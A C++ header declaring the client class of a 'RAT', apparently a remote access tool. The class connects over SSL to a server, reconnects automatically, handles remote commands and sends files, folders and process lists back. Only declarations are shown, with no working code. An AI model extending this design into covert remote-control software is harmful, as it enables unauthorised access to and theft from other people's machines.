#ifndef RAT_CLIENT_HPP
#define RAT_CLIENT_HPP

#include <boost/asio.hpp>
#include <boost/asio/deadline_timer.hpp>
#include <memory>
#include <string>
#include <thread>
#include "NetworkManager.hpp"
#include "FileSender.hpp"
#include "ProcessSender.hpp"
#include "FileFolderSender.hpp"
#include "Packet.pb.h"

namespace Rat 
{

    class Client 
    {
    public:
        Client(const std::string& host, uint16_t port);
        ~Client();
        void start();
        void stop();

    private:
        // void initClientID(const std::string& path = "/usr/local/etc/rat-client/client_id.txt");
        void initClientID(const std::string& path = "./client_id.txt");
        void tryConnect();
        void sendClientId();
        
        void scheduleReconnect();
        void handleCommands();
        void handleUserInput();

        uint64_t this_id_ = -1;
        // boost::asio::io_context io_context_;
        std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_;
        
        std::string host_;
        uint16_t port_;
        bool stopping_;
        NetworkManager networkManager_;
        boost::asio::deadline_timer timer_;
        // ClientSecurity security_;
        std::thread input_thread_;
        std::shared_ptr<FileSender> current_file_sender_;
        std::shared_ptr<ProcessSender> current_process_sender_;
        std::shared_ptr<FileFolderSender> current_file_folder_sender_;
    };

} // namespace Rat

#endif // RAT_CLIENT_HPP